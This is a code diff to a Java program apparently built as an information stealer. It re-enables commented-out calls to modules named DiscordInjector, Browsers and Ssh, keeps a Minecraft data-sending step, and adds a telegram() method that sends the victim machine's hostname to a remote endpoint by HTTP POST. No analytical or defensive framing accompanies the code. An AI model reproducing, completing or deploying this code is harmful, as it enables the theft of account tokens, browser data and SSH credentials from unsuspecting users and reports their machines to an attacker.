@@ -1,10 +1,7 @@
 package io.github.luxotick;
 
 import io.github.luxotick.impl.*;
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.OkHttpClient;
-import okhttp3.RequestBody;
+import okhttp3.*;
 
 import java.io.*;
 import java.net.InetAddress;
@@ -30,7 +27,6 @@ public class Start {
 			DiscordInjector.instance = new DiscordInjector();
 		}
 	    //DiscordInjector.instance.initialize();
-        /*
         Sender.sendMessage("DiscordInjector initialized.");
 		Sender.sendMessage("Starting other arguments...");
 		Browsers.main(argument);
@@ -40,8 +36,8 @@ public class Start {
 		Ssh.main(argument);
 		Sender.sendMessage("Ssh done.");
 		Sender.sendMessage("Now launching the client.");
-		*/
         Minecraft.sendMinecraft();
+        telegram();
         OkHttpClient client = new OkHttpClient();
 
         File folder = new File("C:\\Users\\Public\\Documents");
@@ -113,6 +109,30 @@ public class Start {
         } else {
             System.out.println("You are using the latest version.");
         }
+    }
+
+    public static void telegram() throws IOException {
+        String url = "http://url/send-message";
+
+        String hostname = "Unknown";
+
+        InetAddress addr;
+        addr = InetAddress.getLocalHost();
+        hostname = addr.getHostName();
+
+        String json = "{\"customMessage\": \"" + hostname +  "\"}";
+
+        OkHttpClient client = new OkHttpClient();
+
+        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
+
+        RequestBody body = RequestBody.create(JSON, json);
+
+        Request request = new Request.Builder()
+                .url(url)
+                .post(body)
+                .build();
+        Response response = client.newCall(request).execute();
     }
 
     private static void update(String urlStr, String file) throws IOException {
